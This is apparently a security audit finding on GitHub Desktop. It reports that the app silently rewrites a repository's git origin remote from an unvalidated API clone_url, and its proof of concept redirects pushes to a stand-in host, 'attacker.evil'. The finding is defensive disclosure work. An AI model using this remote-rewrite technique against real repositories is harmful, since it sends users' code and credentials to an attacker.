## Analog Found: Silent Git Remote Rewrite from Untrusted GitHub API `clone_url`

The `milestoneSeason` bug is a case of a "trust" state variable that is not validated/cleared when a related value changes, leaving stale/incorrect trust decisions in place. The closest verified analog in GitHub Desktop is in `updateRemoteUrl`, which silently rewrites a repository's local git `origin` remote based on the `clone_url` field of a GitHub API response, without ever validating that the new URL's host matches the account/endpoint that is supposed to own it.

### Title
Unvalidated `clone_url` from GitHub API response silently rewrites local git remote - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
`updateRemoteUrl` compares an API-supplied `clone_url` to the repository's current git remote and, if the protocol matches and the remote hasn't been "manually changed," calls `gitStore.setRemoteURL` to overwrite the user's `origin` remote with the API value — with no check that the new URL's hostname belongs to the account/endpoint that is supposed to be authoritative for that repository.

### Finding Description
`repositoryWithRefreshedGitHubRepository` in `app-store.ts` fetches the repository object from the API (`api.fetchRepository(owner, name)`) for whichever account was matched to the local remote, and if a `gitHubRepository` already exists, hands the API response straight to `updateRemoteUrl`: [1](#0-0) 

`updateRemoteUrl` performs three checks before rewriting the remote — that the protocol is unchanged, that the current remote still matches the previously-stored `cloneURL` (`remoteUrlUnchanged`), and that the new URL doesn't already match the remote (`urlsMatch`) — but it never checks that the hostname of `apiRepo.clone_url` matches the hostname of the account/endpoint that produced it: [2](#0-1) 

If `condition (protocolsMatch && remoteUrlUnchanged && !urlsMatch)` is met, `gitStore.setRemoteURL(...)` is invoked unconditionally with whatever hostname/path the API response contained. The surrounding code even acknowledges that GitHub-repository associations, once created, are never re-validated or cleared: [3](#0-2) 

This is structurally identical to the reported bug class: a security-relevant piece of state (here, "this remote's clone_url is authoritative and trusted") is propagated and acted upon without re-validating or clearing it against the actual trust boundary (the account's endpoint/hostname) when the underlying value changes.

### Impact Explanation
An attacker who can influence the JSON body of the `fetchRepository` API response for the matched account — e.g., a network/proxy positioned between Desktop and the API endpoint, a compromised or malicious GitHub Enterprise instance, or any MITM/response-tampering scenario for that HTTPS call — can set `clone_url` to an attacker-controlled host. Because Desktop only validates protocol continuity and "hasn't been manually changed" (not hostname authenticity), Desktop will silently call `git remote set-url origin <attacker-host>/...`. Subsequent `git push`/`git fetch` operations from Desktop (and the trampoline credential helper, which resolves credentials by matching the remote's origin against known account endpoints) will target the attacker's server, potentially exfiltrating code, leaking implicitly-sent Git credentials to the wrong host, or serving tampered history back to the user without any visible warning. This lines up with the requested impact categories: "silent corruption of what the user commits or pushes" and "a git remote/proxy response" as the attacker vector.

### Likelihood Explanation
This code path runs automatically as part of a routine, unprivileged background refresh (`refreshSelectedRepositoryAfterAccountChange` → `repositoryWithRefreshedGitHubRepository`) whenever the selected repository has an associated GitHub repository, with no user interaction required beyond having the app open/selecting the repo. It requires no local access, admin rights, or pre-existing malware — only the ability to influence the API response content for a single request, which is explicitly an accepted attacker capability per the task's valid-impact criteria ("a GitHub API object ... or a git remote/proxy response").

### Recommendation
Before calling `gitStore.setRemoteURL`, validate that the new `clone_url`'s hostname matches the hostname of `gitHubRepository.endpoint` (or the account's endpoint) that produced the API response. If it does not match, treat the association as stale/untrusted and either refuse to update the remote or force the user through an explicit confirmation step, mirroring how a "whitelist" style trust flag should be cleared/re-validated rather than blindly propagated.

### Proof of Concept
1. User has a repository whose `origin` remote and stored `gitHubRepository.cloneURL` both point to `https://github.example.com/org/repo.git` (matches `remoteUrlUnchanged`).
2. Attacker (via a network proxy/MITM position or a compromised/malicious response for the `fetchRepository` API call to `github.example.com`) returns a repository object where `clone_url` is `https://attacker.evil/org/repo.git` (same protocol, so `protocolsMatch` is true; hostname differs, so `urlsMatch` is false).
3. `updateRemoteUrl` (`app/src/lib/stores/updates/update-remote-url.ts:42-44`) evaluates `protocolsMatch && remoteUrlUnchanged && !urlsMatch` as true and calls `gitStore.setRemoteURL('origin', 'https://attacker.evil/org/repo.git')`.
4. The user's next `git push`/`fetch` in Desktop silently targets `attacker.evil`, with no dialog or warning shown, because no hostname-authority check exists in the update path.

### Citations

**File:** app/src/lib/stores/app-store.ts (L4880-4882)
```typescript
    // TODO: We currently never clear GitHub repository associations (see
    // https://github.com/desktop/desktop/issues/1144). So we can bail early at
    // this point.
```

**File:** app/src/lib/stores/app-store.ts (L4903-4907)
```typescript

    if (repository.gitHubRepository) {
      const gitStore = this.gitStoreCache.get(repository)
      await updateRemoteUrl(gitStore, repository.gitHubRepository, apiRepo)
    }
```

**File:** app/src/lib/stores/updates/update-remote-url.ts (L18-44)
```typescript
  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
```
